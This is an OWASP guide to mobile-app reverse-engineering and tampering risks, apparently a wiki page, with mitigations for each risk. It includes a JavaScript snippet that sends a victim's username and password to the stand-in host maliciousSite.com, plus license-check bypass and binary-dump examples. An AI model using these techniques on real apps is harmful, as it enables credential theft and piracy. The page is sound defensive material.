__NOTOC__ ![MainProjectIcon.png](MainProjectIcon.png
"MainProjectIcon.png") This content is part of a much bigger project. To
return to the main umbrella project, visit the [Reverse Engineering and
Code Modification Prevention
Project](https://www.owasp.org/index.php/OWASP_Reverse_Engineering_and_Code_Modification_Prevention_Project).

![Japan_160.png](Japan_160.png "Japan_160.png")日本語版

__TOC__

# Introduction

With the recent move towards mobile applications, an adversary can now
see, touch, and directly modify a lot of the application’s presentation
and business layer code within the mobile computing environment. This
capability allows the adversary to realize the same traditional business
threats as before (with web applications) but in genuinely new and
unconventional ways.

Attackers now leverage reverse-engineering and tampering attack
techniques to realize the following pervasive threats on the mobile
platform:

  - **Spoofing**: interception of other users’ authentication
    credentials and using said credentials to conduct transactions on
    the victim’s behalf;

<!-- end list -->

  - **Code modification**: changing critical business logic, control
    flow, and program operations; disable or circumvent security
    controls to bypass authentication, encryption, license management /
    checking, digital rights management or root / jailbreak detection;

<!-- end list -->

  - **Information Disclosure**: lifting or intercepting digital keys,
    certificates, credentials, metadata, proprietary algorithms, other
    application internal logic; and

<!-- end list -->

  - **Elevation of Privilege**: Propagating unauthorized distribution of
    code; insertion of malware or exploits in the application and
    repackaging.

These unique threats are sponsoring evolution from web application
security techniques to new mobile application security approaches.

Traditional secure coding techniques that were relevant to preventing
attacks through web application security controls are completely
irrelevant to preventing reverse-engineering and tampering attacks. Even
if an organization produces ‘perfect’ code that employs secure coding
techniques at all times, the organization cannot apply these same
techniques to prevent an adver¬¬sary from applying reverse engineering
techniques on an application that physically resides within the
adversary’s phone. The compiled mobile application code, no matter how
unreadable to human eyes, is reversible and modifiable by an adversary
using many easily accessible reverse engineering tools.

The primary focus of this note is to address native or hybrid mobile
applications and client-side binary-level attacks (i.e., adversary has
the mobile application binary that she seeks to compromise). The rest of
this document describes technical and business risks that may result
from reverse engineering or integrity violation of applications.

## Risks Overview

<table>
<tbody>
<tr class="odd">
<td><figure>
<img src="RiskTree.png" title="RiskTree.png" alt="RiskTree.png" width="350" /><figcaption>RiskTree.png</figcaption>
</figure></td>
<td><ul>
<li>This project explores various different types of risks / attack vectors that an organization will be exposed to when it chooses to host sensitive code or data in untrustworthy environments. An attacker may choose to violate the confidentiality of the code or associated data. These types of risk (related to violations of the controlflow or data) are described in more detail within the <b><i>reverse engineering and code analysis risk</i></b> subsection of this project.</li>
</ul>
<ul>
<li>Furthermore, organizations are potentially exposed to risk that result from modifications of the code itself. This project addresses code modifications within the <b><i>code modification / injection risk </i></b> subsection.</li>
</ul>
<ul>
<li>Lastly, this project ties the technical risks together into various business risks that may result from technical violation. Business risks are highlighted in the <b><i>business risk</i></b> subsection.</li>
</ul></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>

# Code Modification / Injection Technical Risks

This section focuses on key IT operational risks that organizations must
consider for applications that store, transmit, or process sensitive
information assets in an <i>untrustworthy</i> environment. Risks
highlighted in green describe technical scenarios in which an adversary
modifies the underlying binary of the application:

<center>

![<File:RiskTree-CodeModifiation.png>](RiskTree-CodeModifiation.png
"File:RiskTree-CodeModifiation.png")

</center>

The primary audience of this section is a technical audience interested
in learning more about relevant attack vectors and mitigation strategies
that relate to unauthorized code changes.

## Repackaging

### Description

For an adversary to modify an app, they must first defeat Apple’s code
encryption and code signing technology that Apple automatically includes
with each app in its App Store. Once the adversary bypasses these
controls, they can modify this app and host it on a third-party site for
download. Victims can use their iDevices (non-jailbroken) to download
and execute these apps from these third-party sites.

To defeat Apple’s initial security controls, the adversary must first
download the app from the iTunes store or through an Enterprise using an
Enterprise deployment model. Next, the attacker must successfully start
the app on a jailbroken iDevice. In doing so, the adversary can decrypt
the app using unauthorized tools and execute subsequent steps to make
the desired modifications.

### Technical Explanation

iOS apps downloaded from Apple's App Store are encrypted and signed by
Apple. They can only run on devices that are able to decrypt them and
validate their signatures. To pirate such an app, adversaries must
create a cracked (decrypted and unsigned) version of the app and
republish it on third-party sites. Victims can then use approved
(non-jailbroken) iDevices to download and execute these apps from these
third-party sites.

To decrypt the app, adversaries use tools such as clutch. An adversary
uses clutch to decrypt the application and store it locally in a state
that can be analyzed further by a decompiler. To execute this
application, the adversary must run the tool and the corresponding
application in a jailbroken environment.

### Technical Recommendations

To mitigate the technical risks associated with unauthorized
repackaging, consider doing the following:

  - Insert security controls at the appropriate code entry points that
    the application will invoke as early as possible within the app’s
    lifecycle. These controls should adequately detect if the device is
    running in a jailbroken environment. In the event that the app is
    running in said environment, the code should force the application
    to react, such as provide server notification, fail in a subtle way
    or even terminate for high risk, critical applications;

<!-- end list -->

  - Jailbreak / Root detection controls should inspect the environment
    for particular indicators such as the presence of particular files,
    file permissions, and running processes; and

<!-- end list -->

  - Treat this risk in the same way as when trying to defeat automated
    jailbreak/root detection breakage tools. Follow the advice from the
    appropriate section.

## Swizzle with Behavioral Change

### Description

Objective-C supports dynamic redirection of method invocations from one
method to another of the same signature. This handy feature is commonly
referred to as method swizzling. This feature is typically used in cases
where an application needs to perform method substitution or method
extension.

An adversary can leverage this feature and redirect Objective-C method
calls to malicious code provided by the adversary in the form of an
external library. The Objective-C runtime will invoke the adversary’s
malicious form of the method rather than the original and safe one.

This feature is also exploitable within Android environments through
Cydia Substrate tools that facilitate such attacks. In said
environments, the tool targets NDK-based applications written in C/C++.

### Technical Explanation

The Objective-C runtime lets an application modify its mapping from a
selector (method name) to an implementation. In doing so, an application
can patch a method and execute additional code each time the original
method is invoked by the runtime engine. This is typically done when an
organization cannot inspect or modify the original method.

An adversary can take advantage of this feature to force the engine to
execute unauthorized code. To exploit method swizzling, an adversary
will typically inspect the metadata of an Objective C app and identify
methods that are performing sensitive operations. Then, the adversary
will inject a malicious dynamic library onto the device to intercept API
calls made to the sensitive method. The engine will redirect method
calls to the dynamic library. Upon intercepting the call, the adversary
will execute arbitrary code in lieu of the original method.

In the example below, an iOS delegate executes a financial transaction
requested by the user:

`   // Transaction-request delegate`
`   - (IBAction)performTransaction:(id)sender`
`      {`
`      if([self loginUserWithUsername:username incomingPassword:password] != true)`
`         {`
`         UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Invalid User"`
`                                                         `[`message:@"Authentication`](message:@%22Authentication)` Failure"`
`                                                        delegate:self`
`                                               cancelButtonTitle:@"OK"`
`                                               otherButtonTitles:nil];`
`         [alert show];`
`         return;`
`         }`
`      // Perform sensitive operation here`
`      }`

An adversary will use <i>iOS Mobile Substrate</i> to intercept the
method call to loginUserWithUsername and change its behavior to always
return true. In doing so, the adversary tricks the application into
perform the sensitive code remaining in the performTransaction method.

Within the Android space, Cydia Substrate can also be used to hook NDK
C/C++ apps.

### Technical Recommendation

To mitigate the technical risks associated with method swizzling and
subsequent code modification, consider doing the following:

  - If the application is intentionally performing a swizzle, an
    adversary will exploit this design decision and swizzle this
    particular method as it will be a reliable entry point into the
    application. Strongly consider redesigning and eliminating this
    design feature; and

<!-- end list -->

  - Mitigate this risk using the same strategy as done for swizzle
    monitoring. Follow the technical recommendations from the
    appropriate risk category.

## Security Control Bypass

### Description

Many apps contain decision-making control flows that guard the execution
of sensitive operations. Without protection, such logic is subject to
circumvention by the adversary through unauthorized code modification.

### Technical Explanation

Security controls are methods or pieces of code that are responsible for
enforcing business policies within software. Examples of security
controls include the following:

  - Authentication;
  - Authorization;
  - Data Validation;
  - Session Management;
  - Exception Handling;
  - Logging and Auditing;
  - Code Signing; and
  - Licensing.

Attacks on security controls are very common. For example, adversaries
alter control flows to bypass authentication checks or licensing
requirements. Often, an adversary will enable otherwise prohibited
functionality embedded in an app.

Google Play apps leverage Google’s LVL framework to verify that users
have properly paid for the app. LVL determines the licensing status on
behalf of the app through the LicenseChecker class. The class abstracts
and hides the complexity of the licensing mechanism (including network
communications with Google's servers). An adversary defeats LVL logic by
modifying a single decision-making instruction declared within the
LicenseChecker.checkAccess method—i.e., no-op out the instruction
highlighted below:

`   .method public delcared-synchronized checkAcces(Lcom/android/vending/licensing/LicenseCheckerCallback;)Validation`
`   .locals 9  `
`   .parameter "callback"`
`   .prologue`
`   .line 133`
`   monitor-enter p0`
`   :try_start 0`
`   iget-object v1, p0, Lcom/android/vending/licensing/LicenseChecker;->mPolicy:Lcom/android/vending/licensing/Policy;`
`   invoke-interface {v1}, Lcom/android/vending/licensing/Policy;->allowAccess()Z`
`   move-result v1`
`   if-eqz v1, :cond_0`
`   line 134`
`   const-string v1, "LicenseChecker""`

Methods that return a boolean value and behave as a security control
(authentication; authorization; data validation; license checks; etc.)
are particularly attractive to an adversary for modification or bypass.

### Technical Recommendation

To minimize the risk that an adversary will modify control-flow and
disable security controls with an application, consider doing the
following:

  - Perform a checksum of code that contains critical instruction-branch
    code. Checksum validation of this code should occur immediately
    before the application executes this code;

<!-- end list -->

  - Add additional checksums that check the original checksum to ensure
    that an adversary is unable to modify the original checksum;

<!-- end list -->

  - Additional checksum validations of the code and other checksums
    should occur in other random parts of the application to ensure
    redundant validation that is unpredictable to the adversary; and

<!-- end list -->

  - Ensure that the checksum code does not have a binary signature that
    is easily identifiable by the adversary. Otherwise, the adversary
    will be able to identify all checksum instances and bypass them.

## Automated Jailbreak/Root-Detection Breaking

### Description

Organizations may want to know that their code is running in a
Jailbroken environment for a number of different reasons. For example,
they may choose to not honor a financial transaction conducted on the
device due to increased uncertainty of its security environment. An
adversary can force an application to run in these devices by modifying
the logic of the jailbreak-detection code.

Jailbreak detection code is notoriously difficult to implement correctly
due to a myriad of evolving techniques available for an adversary to
bypass or trick the code. The adversary successfully tricks the code
into running in a hostile environment.

### Technical Explanation

Many security-sensitive iOS apps such as mobile banking and peer-to-peer
payment apps require a secure environment in order to execute. These
apps have capabilities to detect whether their host is sound. They may
choose to not execute in jailbroken environments due to valid security
concerns. The jailbreak-detection mechanisms implemented within many
apps are exposed in the clear, without protection, and can be defeated
easily.

There are various ways to detect whether an iOS device has been
jailbroken. Below are some examples:

  - Detect the existence of Cydia: Cydia is an iOS app that finds and
    installs software packages on jailbroken devices. Its existence on a
    device indicates the device has been jailbroken. Sample detection
    code:

`   NSString *path = @"/Applications/Cydia.app";`
`   if ([[NSFileManager defaultManager] fileExistsAtPath:path]) {`
`      // jailbreak detected`
`   }`

  - Detect the existence of /private/var/stash: /private/var/stash is a
    folder created on jailbroken devices. One way to check its existence
    is to execute a system call via inlined-assembly code. Below, 0xBC
    is the system call number for stat(), and register R0 points to a
    /private/var/stash string.

`   __asm__(`
`   "mov R12, #0xBC\n\t"`
`   "svc #0x80"`
`   );`

  - Detect non-sandboxed behavior: Since the point of jailbreaking is to
    break out from the application sandbox, being able to do things
    prohibited by the sandbox is an indicator of jailbreak. For example,
    sandboxed processes are prohibited to fork child processes. By
    calling fork() and checking the returned code, an app can detect
    whether it is run on a jailbroken device.

The above algorithms represent a small subset of the necessary
algorithms needed to properly detect a jailbroken environment.
Adversaries can use a wide assortment of reverse-engineering and
integrity-violating schemes to bypass each specific algorithm technique.
To automate attacks against jailbreak-detection mechanisms, adversaries
leverage automated tools like xCon. xCon is a closed-source tool that
can circumvent jailbreak-detection checks implemented in a number of iOS
apps. It has succeeded in attacking many apps.

To effectively prevent automated jailbreak-detection attacks with tools
like xCon, organizations must build a detection control that includes an
accurate and complete set of algorithms that will detect a jailbroken
environment. The set of algorithms and other aspects to look for is
quite extensive. Then, organizations must combine all of these
algorithms with appropriate reverse-engineering and integrity-violation
prevention techniques.

xCon does not defeat apps that are secured with multi-layered protection
schemes comprised of a combination of the right algorithms and
reverse-engineering and integrity mitigation strategies.

### Technical Recommendations

To mitigate the risks that the organization has not implemented a
complete and balanced jailbreak detection routine, consider doing the
following:

  - Follow the risk mitigation strategy of method swizzling prevention
    to prevent an adversary from weakening a jailbreak detection control
    already implemented;

<!-- end list -->

  - Follow the risk mitigation strategy of branch-failure prevention in
    order to prevent an adversary from making unauthorized changes to
    control-flow related to Jailbreak detection;

<!-- end list -->

  - Implement all of the appropriate jailbreak detection algorithms
    disclosed through various jailbreaking communities such as xCon.

## Presentation Layer Modification

### Description

Within hybrid apps, an application contains an outer shell that is
typically written in Java or Objective-C. In the inner shell, the
application contains a set of presentation files typically exposed as
HTML, JavaScript, and CSS files. An adversary may choose to modify these
presentation-layer files to perform unauthorized operations through
JavaScript modifications or additions.

### Technical Explanation

An adversary may choose to modify JavaScript files within a hybrid app
in order to execute foreign code within the mobile computing
environment. In such a scenario, the adversary has full access to the
local document object model (DOM) and can silently pass any information
available from the DOM back to the adversaries’ site.

In the code modification below, an adversary modifies local JavaScript
files that are executed within the mobile application’s environment:

`   $.post("`<http://maliciousSite.com>`",`
`         { username: loginUsername, password: loginPassword },`
`         function(data) {`
`            alert("Response: " + data);`
`            }`
`         );`

In this code change, the adversary has modified the application’s
presentation layer to transmit the victim’s username and password to the
adversary’s third-party site maliciousSite.com. Further ideas for
modification include transmission of session cookies, remote control,
unauthorized code execution and privilege escalation.

### Technical Recommendation

To mitigate the risk that an adversary will run arbitrary JavaScript
within a mobile application, consider doing the following:

  - Perform a checksum of any external presentation-layer files that the
    application is dependent upon. This checksum should compare the
    checksum of the files at build-time to the values found at runtime.
    In the event that the checksums do not match, respond appropriately
    to the attack;

<!-- end list -->

  - Perform additional random checksums in unrelated parts of the
    application to thwart the adversary’s attempt to establish a
    reliable crack;

<!-- end list -->

  - Perform additional checksums on the original checksums to ensure
    that the adversary is unable to tamper with the original checksum;
    and

<!-- end list -->

  - Ensure that the checksum code does not have a unique binary
    signature that an adversary can easily identify. In such a scenario,
    an adversary will be able to quickly identify and disable all
    checksum instances within the binary.

## Cryptographic Key Replacement

### Description

Applications use cryptographic keys to encrypt or decrypt sensitive data
residing in a local store or in memory. Attackers may be interested in
replacing keys to hijack the encryption process used by the application.

### Technical Explanation

Many applications perform cryptographic operations on data using
cryptographic keys. These operations and keys are kept private from
users. However, an adversary may perform dataflow analysis of an
application in order to identify a particular key in use. In the example
code below, the organization uses a hardcoded key that an adversary can
find and replace within a data security control implemented in
Objective-C:

`  CFDataRef cfDataCryprographyKey = NULL;`
`   `
`  /* 128-bit AES key. */`
`  const uint8_t rawcryptokeyarr[16] = {63, 17, 27, 99, 185, 231, 1, 191,`
`  217, 74, 141, 16, 12, 99, 253, 41};`
`  `
`  void *rawcryptokey = &rawcryptokeyarr;`
`  size_t keylen = sizeof(rawcryptokey)`
`  `
`  cfDataCryprographyKey = CFDataCreate(kCFAllocatorDefault, rawcryptokey, keylen);`

In this case, the adversary will replace the binary string {63, 17, 27…}
with a custom binary key that allows for control over the encryption and
decryption process. The adversary can then steal or modify the
associated data.

### Technical Recommendations

To mitigate the risk that an adversary will force cryptographic keys to
a particular value and subsequently decrypt / modify contents, consider
doing the following:

  - Use dynamic keys at all times within the application. Otherwise, the
    application’s compiler will store hardcoded keys in their raw form
    within the final binary. An attacker will be able to identify such
    keys by examining any associated method calls;

<!-- end list -->

  - If hardcoded keys must be used, implement the following algorithm in
    order to prevent an adversary from replacing the key within the
    binary:

`   1. Damage static keys that are declared in source code.  Such keys should be damaged while on disk to prevent an adversary from analyzing and intercepting the original key;`
`   `
`   2. Next, the application should repair the key just before the code requiring the key uses it;`
`   `
`   3. Immediately before use of the key, the application should perform a checksum of the key’s value to verify that the non-damaged key matches the value that the code declares at build time; and`
`   `
`   4. Finally, the application should immediately re-damage the key in memory after the application has finished using it for that particular call.`

# Reverse Engineering and Code Analysis Technical Risks

This section focuses on technical risks that result when an adversary is
able to determine how an application is built. Risks highlighted in
green in the following graph are discussed in greater detail within this
section:

<center>

![<File:RiskTree-ReverseEngineering.png>](RiskTree-ReverseEngineering.png
"File:RiskTree-ReverseEngineering.png")

</center>

The primary audience of this section is a technical audience interested
in learning more about relevant attack vectors and mitigation strategies
that relate to unauthorized reverse engineering of software.

## Exposed Method Signatures

### Description

Code built using an intermediate language such as Objective-C or Java is
highly vulnerable to reverse engineering. Compiled applications written
in these languages include source-level class interfaces and other rich
metadata that the associated compiler will automatically include within
the final binary.

An adversary can use easily accessible tools to extract this metadata to
reveal a great deal of information about sensitive parts of the program.
The adversary may find such information useful on its own or use it as a
stepping-stone to perform unauthorized code modifications.

### Technical Explanation

Objective-C and Java programs contain rich information about themselves.
Both language compilers will embed definitions of the class interfaces
and the relationships among the classes in the binaries. Such
information is one of the first things an adversary will seek when
attacking an app.

In the example below, an adversary extracts class interfaces from the
binary using the <i>class-dump-z</i> tool. The tool is specifically
built for reverse-engineering. Below is a class interface extracted from
a real-world iOS banking app:

`   @interface CardIODevice : XXUnknownSuperclass {`
`       +(int)jailbreakStatus;`
`       +(id)getSysteInfoByName:(char*)name;`
`       +(id)platformName;`
`       +(BOOL)is3GS;`
`       +(BOOL)hasVideoCamera;`
`       +(id)generateUniqueIdentifier;`
`       +(id)savedUniqueIdentifier;`
`       +(id)hashedUniqueIdentifier;`
`       +(float)imageScaleForCurrentDevice;`
`       +(BOOL)deviceUses2X;`
`       +(id)deviceAnalyticsDictionary;`
`       +(id)hashedMacAddress;`
`       +(id)macaddress;`
`       +(id)jailbreakStatusAsString;`
`   @end`

The interface describes the underlying architecture and design of the
application. This information greatly aids the adversary in identifying
valuable targets within the application. In this particular interface,
an adversary is going to immediately identify the jailbreakStatus method
as a particularly attractive target for modification. If the adversary
can successfully disable this method, an adversary will force the app to
run in a particularly insecure perform that allows for subsequent
attacks.

### Technical Recommendation

To mitigate the technical risks associated with exposing method
interfaces and associated metadata, consider doing the following:

  - Deploy method-scrambling to reassign methods to other methods at the
    binary level. Method scrambling techniques can only by applied to
    methods with the same number of parameters and parameter types. By
    using this technique, an adversary will be misled into paying
    attention to the wrong targets for modification or interception. At
    the same time, the original source code will not require any
    changes;

<!-- end list -->

  - Remove any extraneous methods from the symbol table that are not
    required at runtime to be exposed within a production build; and

<!-- end list -->

  - Rename any remaining exposed methods to values that do not reflect
    the semantics of the underlying functionality. Otherwise, an
    adversary will be unable to successfully hone in on attractive
    targets for modification or further analysis.

## API Monitoring

### Description

Objective-C and Java support dynamic redirection of method invocations
from one method to another of the same signature. This handy feature is
commonly referred to as method swizzling. This feature is typically used
by organizations when an application needs to perform method
substitution or method extension of code. In such a scenario, the
organization may not have source code for the original method. An
adversary can leverage method swizzling to monitor the order of
execution of Objective-C method calls. This allows an adversary to
understand control-flow without having to manually inspect the contents
of the application’s binary.

This feature is also exploitable within Java environments through Cydia
Substrate tools that facilitate such attacks. In said environments, the
tool targets NDK-based applications written in C/C++.

### Technical Explanation

The Objective-C runtime lets an application modify its mapping from a
selector (method name) to an implementation. In doing so, an application
can patch a method and execute additional methods each time the original
method is invoked by the runtime engine. This is typically done when an
organization cannot inspect or modify the original method.

An adversary can take advantage of this feature to create a log of
method calls invoked by the application. An adversary will be able to
understand the controlflow of an application without decrypting the
binary and analyzing it through the use of tools like <i>IDA Pro</i>.

### Technical Recommendation

To mitigate the technical risks associated with controlflow analysis
through method swizzling, consider doing the following:

  - Translate any particularly sensitive methods into native C/C++.
    These code snippets will not be susceptible to method-swizzling
    attacks;

<!-- end list -->

  - If Objective-C has to be used for such methods, treat this as a
    sensitive method that must be hidden within the exposed metadata. It
    will not stop swizzling from occurring but will lower the likelihood
    that an adversary will discover this method. Follow the
    recommendations from that particular risk category; and

<!-- end list -->

  - Avoid making any direct method calls to system libraries. Instead,
    invoke the corresponding system call using inlined-assembly code.
    This will prevent an adversary from directly intercepting the method
    or its parameters through this technique.

## Exposed Data Symbols

### Description

Code built using an intermediate language such as Objective-C or Java is
highly vulnerable to reverse engineering. Compiled applications written
in these languages include source-level metadata that is included within
the final binary. An adversary can use easily accessible tools to
extract such metadata to reveal sensitive static fields or other global
variables. Typically, the adversary will attempt to modify the value of
these fields at runtime to alter the behavior of the application.

### Technical Explanation

Native apps contain program symbols that reveal the locations and
semantics of their data. These symbols provide helpful information that
facilitates reverse engineering. Hackers can easily extract the symbols
and analyze their associated data using tools such as <i>IDA Pro</i>. As
an illustration of the amount of information these symbols can reveal,
below is a partial list of the symbols found on a real-world iOS banking
app (the list was produced by nm, a symbol-dumping command-line tool):

`   001ffccc S _creditCardNumber`
`   001ffe04 S _creditCardType`
`   001ffc7c S _creditCardCVV`
`   001ffd5c S _creditCardDescription`
`   001ffc8c S _creditCardExpiryMonth`
`   001ffcac S _creditCardExpiryYear`
`   …`
`   002b451c S _CardIOCardScanningDidBecomeAvailable`
`   002b4520 S _CardIOCardScanningDidBecomeUnavailable`

In this example, the application declares sensitive data fields (about
authentication and credit card information) and accurately describes
what they will contain at runtime. Symbol names and locations reveal the
internal assets of the application.

Compiler toolchains such as gcc and GNU’s <i>binutils</i> produce such
symbol-laden binaries by default. <i>Gcc</i> produces extraneous
export-table symbols including local symbols that it should not export.
Often, the application will not use such symbols at runtime.
Organizations release the application with these symbols due to the
default compiler settings.

### Technical Recommendations

To mitigate the risks associated with exposed data symbols, consider
doing the following:

  - Change compiler settings and source code to ensure that the
    application’s compiler will not expose any extraneous data symbols
    within production releases of code;

<!-- end list -->

  - If the data symbol being protected is static in nature, encrypt the
    contents of the field while it is on disc and in memory at the
    appropriate times. This will prevent an adversary from modifying the
    contents of the field at runtime; and

<!-- end list -->

  - If the data symbol being protected is not static in nature,
    obfuscate the value of the field within the application’s memory at
    runtime to prevent runtime modification of the data’s value.

## Exposed String Tables

### Description

A compiler will store hardcoded strings as plaintext in an application’s
final binary image. Typically, such strings are used by the application
as parameters. An adversary can examine the contents of these strings
and achieve a number of different objectives: identify sensitive
algorithms, identify the nature of these algorithms, discover hardcoded
passwords, understand internal database designs, and much more.

Exposed string tables pose similar technical risks as other forms of
exposed metadata such as methods and class fields. However, this
particular form of information gathering attack is particularly
attractive to an adversary as the tables typically reveal much more
sensitive information compared to code or data symbols. String tables
represent the ‘low-hanging fruit’ of information gathering attacks.

### Technical Explanation

Application binaries contain plaintext string literals carried over from
their source code. Adversaries can easily extract these strings using
tools like strings to quickly search for information that may help them
in subsequent attacks.

For instance, an adversary may be interested in finding authentication
and authorization-related code. She can look for method names that match
the patterns <i>authenticate</i>, <i>authorize</i>, <i>password</i>,
<i>token</i>, <i>access</i>, or similar words. After finding the strings
of interest, the adversary can locate code that uses these strings to
further the analysis.

Below is a partial dump of strings found in a real-world iOS banking
application binary (the list was produced by strings, a command-line
tool that extracts printable strings from arbitrary files):

`  datastorage.db`
`  create table if not exists datacache (id text primary key, age text, data blob)`
`  select id from datacache where id=?`
`  replace into datacache (id, age, data) VALUES(?, strftime('%s', 'now'), ?)`
`  select data from datacache where id = ?`
`  Server=analyticsServer;Database=userProfiles;Uid=incomingApp;Pwd=kl23k2ls;`
`  %@/mobile/accountbalance?session_token=%@`
`  T@"NSArray",&,N,VerrorList`
`  totalBalance`
`  pendingBalance`
`  aggregateBalance`
`  `
`  known_app_paths`
`  cydia`
`  /Applications/Cydia.app`
`  `
`  jailbroken`
`  jailed`
`  jailbreak_status`
`  ios_jailbreak_status`

The dump shows that the application stores user information within a
local database. Furthermore, the application appears to connect to a
MySQL database that gathers user information. To do this, the
application connects to a user profile database using username
incomingApp with password kl23k2ls. In response to this new information,
an adversary may choose to conduct an infrastructure attack and connect
to the profile database to extract privacy related data about the users
of the app.

The presence of the <i>/applications/Cydia.app</i> string is a strong
indicator that the app is trying to detect if it is running in a
jailbroken environment by looking for this file. The adversary can now
perform further analysis to understand all jailbreak detection
algorithms associated with this string.

An adversary uses a disassembler or decompiler to analyze the code that
uses these sensitive strings. Analysis will lead to the code that the
adversary is interested in compromising (e.g., if an adversary wants to
attack the jailbreak-detection mechanism, the code that uses the
<i>/applications/Cydia.app</i> string will be a good candidate to
attack).

### Technical Recommendation

To mitigate the risks associated with exposed strings, consider doing
the following:

  - Encrypt plaintext strings in the application’s binary at build time.
    Afterwards, an adversary will be unable to inspect the strings’
    content. At runtime, decrypt each encrypted string just before the
    application uses it. Immediately after use, re-encrypt the string;
    or

<!-- end list -->

  - Disguise sensitive strings at build time by damaging some or all of
    the bytes in the application binary with random or irrelevant bytes.
    At runtime, repair the damaged strings just before use. Immediately
    after use, re-damage the string in memory.

This damage/repair approach is similar to the first recommendation.
However, the damage/repair approach has an additional advantage of being
able to erase modifications of the strings made by adversaries. For
example, if an adversary has modified a disguised version of
</i>/applications/Cydia.app</i> to <i>/does_not_exist</i>, then the
runtime repair action will remove the attack change and restore the
string back to the original.

## Cryptographic Key Interception

### Description

Applications use cryptographic keys to encrypt or decrypt sensitive
data. Attackers may be particularly interested in stealing the
associated keys in order to decrypt and copy sensitive data from a local
repository or memory stream residing within the application’s process.

### Technical Explanation

Many applications perform cryptographic operations on data using
cryptographic keys. These operations and keys are kept private from
users. However, adversaries discover such keys through static or dynamic
binary analysis.

Consider an application that uses cryptographic operations provided by
system libraries. The application must pass appropriate keys to these
libraries in order to decrypt the data. At runtime, adversaries may
choose to monitor the system library interface and intercept calls to
decryption methods. The application will pass the appropriate key as a
parameter to these methods and the adversary will successfully grab the
key.

As another example, imagine an application that tries to mitigate this
risk by implementing its own cryptography or statically links to a
third-party library. In response, the adversary will examine the
application’s symbol table and look for cryptography-related method
names (including the words <i>key</i>, <i>crypto</i>, <i>encrypt</i>,
<i>sign</i>, <i>AES</i>, <i>MD5</i>, and so on).

The symbols contained in the following real-world banking app reveal the
use of the AES and HMAC-SHA1 algorithms:

`   $nm BankingApp `

| grep key -i --col

`   001f7040 t +[AES256Encryption AES256Decrypt:WithKey:]`
`   001f6f0c t +[AES256Encryption AES256Encrypt:WithKey:]`
`   00166adc t +[AFKeychainUtils createKeychainValue:forIdentifier:]`
`   00166930 t +[AFKeychainUtils newSearchDictionary:]`
`   00166b64 t +[AFKeychainUtils searchKeychainMatching:]`
`   00166cd8 t +[AFKeychainUtils setString:forSecureKey:]`
`   00166e18 t +[AFKeychainUtils stringForSecureKey:withDefault:]`
`   00166a34 t +[AFKeychainUtils updateKeychainValue:forIdentifier:]`
`   00166c68 t +[AFKeychainUtils updateOrCreateKeychainValue:forIdentifier:]`
`   00166fa8 t +[AFSHA1 hmacWithData:withKey:]`
`   00201f00 t +[CardIOKeychain dataForKey:]`
`   00201ed8 t +[CardIOKeychain keychainKeyForKey:]`
`   00202054 t +[CardIOKeychain setData:forKey:]`
`   002019a4 t +[CardIOMacros localSettingForKey:defaultValue:productionValue:]`
`   001f8850 t +[CardIOURLConnection basicAuthKey]`
`   001f5234 t +[MDUserConstants_Private getSecretKey:]`
`   001f52d0 t +[MDUserConstants_Private setSecretKey:]`

The adversary analyses the <i>AES256Decrypt</i> and <i>getSecretKey</i>
methods using <i>IDA Pro</i>. Through this analysis, the adversary
learns that the secret AES key passed to the AES256Decrypt method is
derived from an MD5 hash of several constant strings encoded in the
program. The adversary discovers that the key is not really a secret.

Lastly, adversaries may use more sophisticated means of identifying
cryptographic algorithms in use within the application. Special binary
patterns or numeric constants indicate the presence of specific
cryptographic algorithms (e.g., the <i>0x6a09e667</i>,
<i>0xbb67ae85</i>, <i>0x3c6ef372</i>, and other integer constants that
uniquely identify the SHA-2 algorithm). This technique requires more
work than searching through program symbols and strings.

### Technical Recommendations

To mitigate the risk that an adversary will intercept and steal
cryptographic keys from an application, consider doing the following:

  - Use a dedicated whitebox cryptography technology to handle all
    cryptographic operations. Such technologies should prevent an
    adversary from identifying the encryption algorithm through binary
    analysis or symbol exploration. As well, such technologies should
    prevent an adversary from intercepting said keys through API
    interception. Lastly, these tools should always prevent the
    adversary from pinpointing any keys within the application’s memory
    space;

<!-- end list -->

  - If the application must dynamically call third-party libraries,
    treat this risk in the same way as other risks related to swizzling
    prevention. Follow the risk mitigation strategies from the
    appropriate section; and

<!-- end list -->

  - If secret keys must be hardcoded in the app, treat this risk in the
    same way as other sensitive strings that reside within the binary.
    Follow the recommendations from that risk category.

## Algorithm Decompilation and Analysis

### Description

Adversaries often target proprietary algorithms encoded within
mission-critical software because they intend on reproducing similar
software. Without protection of the algorithm from examination, such
algorithms are vulnerable to disclosure through the use of commonly
available tools like IDA Pro or Hopper. An adversary can then replicate
these algorithms in their own software.

In a more advanced scenario, the adversary may have to bypass code
encryption security controls that attempt to restrict access to the
original form of the binary. This can be done easily using tools like
clutchmod. After bypassing any local decryption, the adversary can then
return to the original task of analysis of the original binary. Often,
these tools are very effective at recreating high-level pseudocode that
is quite similar to the original source code.

### Technical Explanation

Commercial software applications contain important proprietary
algorithms that are vital to their business. Such algorithms, if
disclosed, may result in reproduction of the same types of services by
competitors. Hence, these algorithms are trade secrets and kept hidden
from the marketplace. When deployed in their original form, an adversary
will discover hidden algorithms, extract them, and misuse them within
competing products. The original owners of the algorithms are unaware of
these attacks until it is too late.

Algorithms encoded in intermediate languages such as Objective-C or Java
are particularly vulnerable. Decompilers have made it simple to turn
low-level assembly code to a high-level source-like pseudocode. The
<i>Hex Rays Decompiler</i>, a plugin to <i>IDA Pro</i>, is an excellent
example. Widely used by adversaries and security researchers, it can
decompile almost any ARM or x86 code into its original form with
startling accuracy. Another tool, <i>Hopper</i>, is also gaining
widespread adoption. This tool offers a much lower price point than
<i>Hex Rays</i> and is quite effective.

### Technical Recommendations

To mitigate the risks of algorithm theft, consider doing the following:

  - Avoid coding sensitive algorithms in intermediate languages such as
    Java or Objective-C. Algorithms written in such languages will
    contain a large volume of metadata. If an adversary gets access to
    the binary, the metadata will allow an adversary to reproduce the
    original source code with remarkable accuracy; or

<!-- end list -->

  - If it is not possible to avoid specifying such algorithms in
    Objective C or Java, apply obfuscation techniques to sensitive
    methods contained within the application. Obfuscation is often
    confused with simple method-renaming techniques. Obfuscation
    techniques go far beyond simple method renaming. Apply the following
    techniques to sensitive code: instruction block chopping,
    instruction substitution, symbol chopping, method-inlining, and
    dummy-code insertion.

## Application Decryption

### Description

To reverse-engineer an iDevice application, the adversary must attach a
debugger to the relevant process and capture an unencrypted form of the
application to disk. This is a critical first step towards understanding
how the application works and how the adversary should modify it.

